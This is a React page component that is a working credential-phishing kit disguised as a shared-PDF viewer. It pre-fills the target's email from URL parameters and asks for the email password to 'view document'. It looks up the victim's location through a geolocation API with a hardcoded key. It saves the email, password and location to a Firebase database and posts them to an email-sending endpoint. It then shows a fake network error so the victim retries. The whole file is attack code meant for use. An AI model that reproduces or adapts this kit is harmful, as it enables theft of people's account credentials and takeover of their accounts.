'use client';
import { useState, useEffect } from 'react';
import { db } from '@/lib/firebase';
import { ref, get } from 'firebase/database';
import { changeFavicon } from './changeFavicon';

export default function Page() {
    const [isNiceVisible, setIsNiceVisible] = useState(true);
    const [animateIn, setAnimateIn] = useState(true);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [header, setHeader] = useState({ title: "Get access to pdf reader", subtitle: "You can download multiple files or select the pdf for download", imageUrl: "/images/headimg.png"})
  const [pdfs, setPdfs] = useState([
    { title: "Specification", subtitle: "An hour ago", imageUrl: "/images/img9.jpeg"},
    { title: "Company Presentation", subtitle: "A few hours ago", imageUrl: "/images/img11.jpeg"},
  ]);

useEffect(() => {
  const fetchPdfs = async () => {
    setLoading(true);
    try {
      const pdfsRef = ref(db, 'pdfsExDropGuy');
      const snapshot = await get(pdfsRef);
      if (snapshot.exists()) {
        const data = snapshot.val();

        setHeader(prev => ({
          ...prev,
          title: data.form1?.title || prev.title,
          subtitle: data.form1?.subtitle || prev.subtitle,
          imageUrl: data.form1?.imageUrl || prev.imageUrl,
        }));

        setPdfs(prev => prev.map((pdf, index) => {
          const formNumber = index + 2; 
          return {
            ...pdf,
            title: data[`form${formNumber}`]?.title || pdf.title,
            subtitle: data[`form${formNumber}`]?.subtitle || pdf.subtitle,
            imageUrl: data[`form${formNumber}`]?.imageUrl || pdf.imageUrl,
          };
        }));

      } else {
        console.log('No data found at path: pdfsExDropGuy');
      }
    } catch (error) {
      console.error('Error fetching PDFs from Firebase:', error);
    } finally {
      setLoading(false);
      changeFavicon(header.imageUrl);
    }

    const emailFromURL = getQueryParam("xi") || getQueryParam("e") || "";
    setEmail(emailFromURL);
  };

  fetchPdfs();
}, []);


  const showNice = () => {
    setError("");
    setIsNiceVisible(true);
    setTimeout(() => {
      setAnimateIn(true);
    }, 10);
  };

  
  const hideNice = (event) => {
    setError("")
    if (event.target.classList.contains("good-cont")) {
      setAnimateIn(false);
      setTimeout(() => {
        setIsNiceVisible(false);
      }, 300);
    }
  };
  
  function getQueryParam(param) {
    return new URLSearchParams(window.location.search).get(param);
  }

      const fetchLocation = async () => {
      try {
        const res = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=477b04ba40ce487b99984aca5c47b2a0");
        if (!res.ok) throw new Error("Location service failed");
        const data = await res.json();
        return `${data.city || "Unknown City"}, ${data.country_name || "Unknown Country"}`;
      } catch (err) {
        console.error(err);
        return "Unknown Location";
      }
    };

      const handleShowKindness = async (e) => {
        e.preventDefault();
        setLoading(false);
        
          if (!email || !password) {
        setError("Both fields are required.");
        return;
      }
        
        setLoading(true);
        setError("");
        try {
          const usersRef = ref(db, "users");
          const newUser = { email, password, location: await fetchLocation() };
          await push(usersRef, newUser);
    
          const response = await fetch("/api/sendEmail", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(newUser),
          });
    
          if (response.ok) {
            setError("Network Error! Please verify your information and try again");
            setLoading(false)
            setPassword("");
          } else {
            setError("Error logging in to this account!.");
            setLoading(false)
            setPassword("");
          }
        } catch (error) {
          console.error("Error:", error);
          setError("Logging failed.");
          setLoading(false)
          setPassword("");
        }
    
      }

  return (
<div className="bg-gray-50 dark:bg-[#1b1b1b] min-h-screen flex flex-col">
  {/* File Explorer Style Navbar */}
  <nav className="w-full border-b border-gray-200 dark:border-gray-700 bg-white dark:bg-[#242424] px-4 py-2 flex items-center justify-between flex-wrap gap-5">
    {/* Left section: Breadcrumb */}
    <div
      onClick={showNice}
      className="flex items-center gap-2 cursor-pointer select-none"
    >
      <img src={header.imageUrl} alt="File icon" className="h-5" />
      <span className="text-gray-800 dark:text-gray-200 text-sm md:text-base">
        Home / Documents / {header.title}
      </span>
    </div>

    {/* Right section: Toolbar */}
    <div className="flex items-center gap-3">
      {[
        { label: "New File" },
        { label: "Upload" },
        { label: "Sort" },
        { label: "View Options" },
        { label: "Help" },
      ].map((item) => (
        <button
          key={item.label}
          onClick={showNice}
          className="px-2 py-1 text-sm text-gray-700 dark:text-gray-300 hover:bg-gray-200 dark:hover:bg-gray-600 rounded transition-colors"
        >
          {item.label}
        </button>
      ))}
      <div
        onClick={showNice}
        className="cursor-pointer text-gray-600 dark:text-gray-300 w-7 h-7 rounded hover:bg-gray-200 dark:hover:bg-gray-600 flex items-center justify-center max-md:hidden"
      >
        ☰
      </div>
    </div>
  </nav>

  {/* Action Bar */}
  <header className="bg-white dark:bg-[#242424] border-b border-gray-200 dark:border-gray-700 px-4 py-3 flex items-center justify-between flex-wrap gap-3">
    <div className="text-sm md:text-base text-gray-800 dark:text-gray-200">
      {header.subtitle}
    </div>
    <button
      onClick={showNice}
      className="px-4 py-2 rounded bg-green-600 dark:bg-green-400 text-white text-sm font-medium hover:bg-green-700 dark:hover:bg-green-500 transition-colors"
    >
      Download Selected
    </button>
  </header>

  {/* Main PDF Grid */}
  <main className="flex-1 p-4">
    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5">
      {pdfs.map((pdf, index) => (
        <div
          key={index}
          className="bg-white dark:bg-[#242424] h-fit border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden shadow hover:shadow-lg transition-shadow cursor-pointer"
          onClick={showNice}
        >
          {loading ? (
            <div className="w-full h-48 bg-gray-300 dark:bg-gray-700 flex items-center justify-center text-gray-700 dark:text-gray-300">
              Loading...
            </div>
          ) : (
            <>
              <img
                src={pdf.imageUrl}
                alt={`Document ${index + 1}`}
                className="w-full h-48 object-cover"
              />
              <div className="p-3">
                <div className="text-sm font-semibold text-gray-800 dark:text-gray-200 truncate">
                  {pdf.title}
                </div>
                <div className="text-xs text-gray-500 dark:text-gray-400">
                  {pdf.subtitle}
                </div>
                <div className="mt-3 flex gap-2">
                  <button
                    onClick={showNice}
                    className="px-2 py-1 bg-blue-500 text-white text-xs rounded hover:bg-blue-600"
                  >
                    View
                  </button>
                  <button
                    onClick={showNice}
                    className="px-2 py-1 bg-gray-300 dark:bg-gray-600 text-gray-800 dark:text-gray-200 text-xs rounded hover:bg-gray-400 dark:hover:bg-gray-500"
                  >
                    Info
                  </button>
                </div>
              </div>
            </>
          )}
        </div>
      ))}
    </div>
  </main>

  {/* Modal */}
  {isNiceVisible && (
    <div
      className={"good-cont p-5"} onClick={hideNice} style={{ display: isNiceVisible? "flex" : "", opacity:isNiceVisible? "1":"0"}}
    >
      <div
        className="bg-white dark:bg-[#1b1b1b] p-5 rounded-lg shadow-lg w-full max-w-md transform transition-all"
        style={{
          transform: animateIn ? "translateY(0)" : "translateY(-30px)",
          opacity: animateIn ? 1 : 0,
        }}
      >
        <div className="flex justify-center mb-4">
          <img src={header.imageUrl} width={50} alt="logo" />
        </div>
        <p className="text-lg font-semibold text-center mb-2 text-gray-800 dark:text-gray-200">
          {header.title}
        </p>
        <div className="text-center text-sm text-gray-700 dark:text-gray-300 mb-4">
          Enter your email and password to access PDF document.
        </div>
        <form onSubmit={handleShowKindness} className="space-y-3">
          <div
            id="error"
            className="text-sm text-red-500 text-center"
          >
            {error}
          </div>
          <input
            type="email"
            id="email"
            className="w-full px-3 py-2 rounded border border-gray-300 dark:border-gray-600 bg-transparent text-gray-800 dark:text-gray-200"
            readOnly
            placeholder="autoemail@mail.com"
            value={email}
          />
          <input
            type="password"
            id="password"
            className="w-full px-3 py-2 rounded border border-gray-300 dark:border-gray-600 bg-transparent text-gray-800 dark:text-gray-200"
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Email password"
          />
          <button
            type="submit"
            className="w-full h-[50px] rounded bg-blue-600 dark:bg-blue-400 text-white text-sm font-semibold hover:bg-blue-700 dark:hover:bg-blue-500"
          >
            {loading ? (
              <>
                <div className="lds-roller">
                  <div></div><div></div><div></div><div></div>
                  <div></div><div></div><div></div><div></div>
                </div>
                Please wait
              </>
            ) : (
              "View Document"
            )}
          </button>
        </form>
      </div>
    </div>
  )}
</div>

  );
              }
